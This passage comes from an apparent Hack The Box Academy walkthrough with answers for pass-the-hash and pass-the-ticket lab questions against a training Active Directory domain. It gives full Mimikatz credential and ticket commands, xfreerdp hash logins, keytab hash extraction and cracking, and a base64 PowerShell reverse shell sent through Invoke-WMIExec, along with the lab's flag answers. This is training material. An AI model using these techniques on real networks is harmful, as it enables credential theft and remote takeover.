         * NTLM     : {hidden}
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
        tspkg :
        wdigest :
         * Username : david
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :

<SNIP>

mimikatz(commandline) # exit
Bye!
```

Students will find the NTLM hash for David on `mimikatz` output and submit it as the answer.

Answer: `c39f2beb3d2ec06a62cb887fb391dee0`

# Pass the Hash (PtH)

## Question 4

### “Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.“

Students will use `xfreerdp` to establish a RDP session as Administrator:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.167.195 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will then leverage `mimikatz` that is located in `C:\tools\` to perform a Pass-The-Hash attack to run a new `cmd.exe` terminal as `david`:

Code: cmd

```cmd
C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

```cmd-session
C:\Users\Administrator>C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe
user    : david
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : c39f2beb3d2ec06a62cb887fb391dee0
  |  PID  5580
  |  TID  5948
  |  LSA Process is now R/W
  |  LUID 0 ; 1009965 (00000000:000f692d)
  \_ msv1_0   - data copy @ 000001F830CA69E0 : OK !
  \_ kerberos - data copy @ 000001F830AE6018
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F831514E48 (32) -> null

mimikatz(commandline) # exit
Bye!
```

In the newly opened command prompt, students will use type to read the flag from `\\DC01\david\david.txt` as submit this value as the answer:

![Password_Attacks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_26.png)

Answer: `D3V1d_Fl5g_is_Her3`

# Pass the Hash (PtH)

## Question 5

### “Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.“

Students will use `xfreerdp` to establish a RDP session as Administrator:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.167.195 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will then leverage `mimikatz` that is located in `C:\tools\` to perform a Pass-The-Hash attack to run a new `cmd.exe` terminal as `julio`:

Code: cmd

```cmd
C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
```

```cmd-session
C:\Users\Administrator>C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64f12cddaa88057e06a81b54e73b949b
  |  PID  5740
  |  TID  1960
  |  LSA Process is now R/W
  |  LUID 0 ; 1308484 (00000000:0013f744)
  \_ msv1_0   - data copy @ 000001F831213180 : OK !
  \_ kerberos - data copy @ 000001F830AE66A8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F831514E48 (32) -> null

mimikatz(commandline) # exit
Bye!
```

In the newly opened command prompt, students will use type to read the flag from `\\DC01\julio\julio.txt` as submit this value as the answer:

![Password_Attacks_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_27.png)

Answer: `JuL1()_SH@re_fl@g`

# Pass the Hash (PtH)

## Question 6

### “Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.“

Students will obtain a shell as user `julio`. For this, students can refer to the walkthrough of question 5.

Once a shell as `julio` is established, students will start a PowerShell session by executing:

Code: cmd

```cmd
powershell -ep bypass
```

```cmd-session
C:\Windows\system32>powershell -ep bypass

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

Students will then use `cd` to change the current working directory to `C:\tools\Invoke-TheHash\`:

Code: powershell

```powershell
cd C:\tools\Invoke-TheHash\
```

```powershell-session
PS C:\Windows\system32> cd C:\tools\Invoke-TheHash\
```

Students will then use PowerShell's `Import-Module` to import `Invoke-TheHash.psd1`:

Code: powershell

```powershell
Import-Module .\Invoke-TheHash.psd1
```

```powershell-session
PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

Students will then visit the [Online - Reverse Shell Generator](https://www.revshells.com/) and generate a PowerShell #3 (Base64) reverse shell as follows:

![Password_Attacks_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_28.png)

Once this is done, students will open a new command prompt on `MS01` and start a listener using `nc` located in `C:\tools`:

Code: cmd

```cmd
C:\tools\nc.exe -nlvp 8008
```

```cmd-session
C:\Users\Administrator>C:\tools\nc.exe -nlvp 8008

listening on [any] 8008 ...
```

Students will now return to the PowerShell session as `julio` and execute the following command and paste their previous generated base64 reverse shell in the `-Command` option:

Code: powershell

```powershell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

```powershell-session
PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

[+] Command executed with process ID 1796 on DC01
```

Students will receive a connection on their `nc` listener as such:

Code: cmd

```cmd
C:\Users\Administrator>C:\tools\nc.exe -nlvp 8008
listening on [any] 8008 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49862

PS C:\Windows\system32>
```

Students then need to use `type` command to see the flag located at `C:\julio\flag.txt`:

Code: powershell

```powershell
type C:\julio\flag.txt
```

Code: powershell

```powershell
PS C:\Windows\system32> type C:\julio\flag.txt

{hidden}
```

![Password_Attacks_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_29.png)

Answer: `JuL1()_N3w_fl@g`

# Pass the Ticket (PtT) from Windows

## Question 1

### “Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?“

Students start by establishing an `RDP` session using with user `Administrator` and password `AnotherC0mpl3xP4$$`.

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'AnotherC0mpl3xP4$$'
```

```shell-session
┌─[eu-academy-1]─[10.10.15.51]─[htb-ac-569447@htb-uphdnbljen]─[~]
└──╼ [★]$ xfreerdp /v:10.129.164.157 /u:Administrator /p:'AnotherC0mpl3xP4$$'

<SNIP>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will then open a command prompt and run `mimikatz.exe` with the `sekurlsa::tickets /export` command:

Code: cmd

```cmd
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

```cmd-session
C:\Users\Administrator>C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::tickets /export

Authentication Id : 0 ; 490439 (00000000:00077bc7)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MS01
Logon Server      : MS01
Logon Time        : 6/9/2025 9:09:21 AM
SID               : S-1-5-21-430213916-1543111962-1809483319-500

         * Username : Administrator
         * Domain   : MS01
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

<SNIP>

           * Saved to file [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi !

mimikatz(commandline) # exit
Bye!
```

A simple `dir` command will be enough to list the contents of the directory. Students will then count the number of TGT tickets belonging only to users:

Code: cmd

```cmd
dir
```

```cmd-session
C:\Users\Administrator>dir

 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users\Administrator

06/09/2025  09:10 AM    <DIR>          .
06/09/2025  09:10 AM    <DIR>          ..
09/22/2022  01:41 PM    <DIR>          3D Objects
09/22/2022  01:41 PM    <DIR>          Contacts
09/22/2022  01:41 PM    <DIR>          Desktop
09/22/2022  01:41 PM    <DIR>          Documents
10/12/2022  05:51 AM    <DIR>          Downloads
09/22/2022  01:41 PM    <DIR>          Favorites
09/22/2022  01:41 PM    <DIR>          Links
09/22/2022  01:41 PM    <DIR>          Music
09/22/2022  01:41 PM    <DIR>          Pictures
09/22/2022  01:41 PM    <DIR>          Saved Games
09/22/2022  01:41 PM    <DIR>          Searches
09/22/2022  01:41 PM    <DIR>          Videos
06/09/2025  09:10 AM             1,703 [0;3e4]-0-0-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
06/09/2025  09:10 AM             1,705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
06/09/2025  09:10 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
06/09/2025  09:10 AM             1,659 [0;3e7]-0-1-40a50000.kirbi
06/09/2025  09:10 AM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
06/09/2025  09:10 AM             1,743 [0;3e7]-0-3-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
06/09/2025  09:10 AM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,641 [0;45828]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,623 [0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
06/09/2025  09:10 AM             1,633 [0;46eb9]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
              13 File(s)         21,687 bytes
              14 Dir(s)  17,968,803,840 bytes free
```

Students will observe `3` user tickets, which belong to `Julio`, `John`, and `David`.

Answer: `3`

# Pass the Ticket (PtT) from Windows

## Question 2

### “Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john“

After obtaining user `john` TGT from question 1, students will use `mimikatz` to pass his ticket using `kerberos::ptt` followed by the location of the ticket itself, in this case, `C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi`.

Code: cmd

```cmd
C:\tools\mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
```

```cmd-session
C:\Users\Administrator>C:\tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!
```

Next, students will query the contents of `john`'s directory locate at `DC01.inlanefreight.htb` and get the flag from the `john.txt` file:

Code: cmd

```cmd
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
```

```cmd-session
C:\Users\Administrator>dir \\DC01.inlanefreight.htb\john

 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01.inlanefreight.htb\john

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
               2 Dir(s)  18,269,167,616 bytes free

C:\Users\Administrator>type \\DC01.inlanefreight.htb\john\john.txt

{hidden}
```

Answer: `Learn1ng_M0r3_Tr1cks_with_J0hn`

# Pass the Ticket (PtT) from Windows

## Question 3

### “Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt“

Students need to open Command Prompt as Administrator and move to the `C:\tools` directory, then run `mimikatz`:

Code: cmd

```cmd
cd C:\tools
mimikatz.exe
```

```cmd-session
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\tools
C:\tools>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Subsequently, students need to pass the ticket for `John`, utilizing the TGT `[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi` attained previously:

Code: cmd

```cmd
kerberos::ptt C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
```

```cmd-session
mimikatz # kerberos::ptt C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi

* File: 'C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
```

Students then need to move to PowerShell from the same Command Prompt, and enter a Remote PowerShell session on DC01:

Code: cmd

```cmd
powershell
Enter-PSSession -ComputerName DC01
```

```cmd-session
C:\tools>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents>
```

At last, students can read the flag:

Code: cmd

```cmd
cat C:\john\john.txt
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> cat C:\john\john.txt

{hidden}
```

Answer: `P4$$_th3_Tick3T_PSR`

# Pass the Ticket (PtT) from Linux

## Question 1

### “Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory."

Students first need to connect to the spawned target machine using SSH with user `david@inlanefreight.htb` and password `Password2` on port `2222`:

Code: shell

```shell
ssh david@inlanefreight.htb@STMIP -p 2222
```

```shell-session
┌─[eu-academy-1]─[10.10.15.51]─[htb-ac-569447@htb-uphdnbljen]─[~]
└──╼ [★]$ ssh david@inlanefreight.htb@10.129.163.88 -p 2222

The authenticity of host '[10.129.163.88]:2222 ([10.129.163.88]:2222)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.163.88]:2222' (ED25519) to the list of known hosts.
david@inlanefreight.htb@10.129.163.88's password: 

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

<SNIP>

david@inlanefreight.htb@linux01:~$
```

Then, students will be able to read the flag located at `/home/david@inlanefreight.htb/flag.txt`:

Code: shell

```shell
cat /home/david@inlanefreight.htb/flag.txt 
```

```shell-session
david@inlanefreight.htb@linux01:~$ cat /home/david@inlanefreight.htb/flag.txt 

{hidden}
```

Answer: `Gett1ng_Acc3$$_to_LINUX01`

# Pass the Ticket (PtT) from Linux

## Question 2

### “Which group can connect to LINUX01?"

Using the SSH session from the previous question, students need to run the `realm` command:

Code: shell

```shell
realm list
```

```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: {hidden}
```

Reading the output students will find the permitted group.

Answer: `Linux Admins`

# Pass the Ticket (PtT) from Linux

## Question 3

### “Look for a keytab file that you have read and write access. Submit the file name as a response."

Students will use `find` to look for files with the name `keytab` in it:

Code: shell

```shell
find / -name *keytab* -ls 2>/dev/null
```

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Jun  9 14:56 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262607      4 -rw-rw-rw-   1 root     root          216 Jun  9 15:00 /opt/specialfiles/{hidden}
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.**ri**
```

Checking the output the correct keytab will be located at `/opt/specialfiles/`. Students will submit the filename as the answer.

Answer: `carlos.keytab`

# Pass the Ticket (PtT) from Linux

## Question 4

### "Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's directory as a response."

Using the previously established SSH session, students need to extract the hashes from `carlos.keytab` using `keytabextract`:

Code: shell

```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Then, students need to browse to [https://crackstation.net](https://crackstation.net/) and decrypt the NTLM hash `a738f92b3c08b424ec2d99589a9cce60`:

The hash's cleartext value is `Password5`, thus, students can now SSH to the spawned target machine as `carlos` with the credentials `carlos:Password5`:

Code: shell

```shell
ssh carlos@inlanefreight.htb@STMIP -p 2222
```

```shell-session
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-bmdznxzunh]─[~]
└──╼ [★]$ ssh carlos@inlanefreight.htb@10.129.129.132 -p 2222

carlos@inlanefreight.htb@10.129.129.132's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

carlos@inlanefreight.htb@linux01:~$ 
```

Students then can print the flag file "flag.txt" located at `/home/carlos@inlanefreight.htb/flag.txt`:

```shell-session
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/flag.txt

{hidden}
```

Answer: `C@rl0s_1$_H3r3`

# Pass the Ticket (PtT) from Linux

## Question 5

### "Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstation's directory as a response."

Using the perviously established SSH session as `carlos`, students need to check `Carlo's` crontab:

Code: shell

```shell
crontab -l
```

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
